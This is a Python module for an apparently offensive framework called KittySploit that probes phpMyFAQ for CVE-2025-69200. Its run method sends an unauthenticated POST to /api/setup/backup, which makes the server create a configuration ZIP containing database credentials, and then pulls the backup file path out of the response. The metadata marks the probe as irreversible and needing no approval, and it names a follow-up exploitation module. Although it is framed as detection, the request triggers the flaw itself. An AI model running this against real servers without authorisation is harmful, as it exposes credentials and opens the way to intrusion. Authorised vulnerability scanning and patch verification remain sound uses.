#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""phpMyFAQ unauthenticated config backup via /api/setup/backup (CVE-2025-69200)."""

import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'phpMyFAQ - Unauth Config Backup Detection (CVE-2025-69200)',
        'description': (
            'phpMyFAQ (<= 4.1.0-RC / < 4.0.16) allows unauthenticated POST '
            '/api/setup/backup to generate and expose a configuration ZIP containing '
            'database credentials (CVE-2025-69200 / GHSA-9cg9-4h4f-j6fg).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2025', 'phpmyfaq', 'exposure',
            'credentials', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/phpmyfaq_cve_2025_69200_backup',
                ],
            },
        },
        'references': [
            'https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9cg9-4h4f-j6fg',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-69200',
        ],
        'cve': 'CVE-2025-69200',
    }

    base_path = OptString('', 'Optional phpMyFAQ base path prefix', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        path = f'{self._prefix()}/api/setup/backup'
        r = self.http_request(
            method='POST',
            path=path,
            data='4.0.15',
            headers={'Content-Type': 'text/plain'},
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        backup = ''
        try:
            data = json.loads(body)
            backup = str(
                data.get('backupFile')
                or data.get('backup')
                or data.get('url')
                or ''
            )
        except Exception:
            m = re.search(r'(phpmyfaq-config-backup[^"\s]+\.zip|/content/core/config/[^"\s]+\.zip)', body)
            if m:
                backup = m.group(1)
        if 'backup' in body.lower() and (backup or 'content/core/config' in body):
            self.set_info(
                severity='high',
                reason='phpMyFAQ CVE-2025-69200 unauthenticated config backup endpoint',
                path=path,
                backup_file=backup[:200],
            )
            return True
        return False
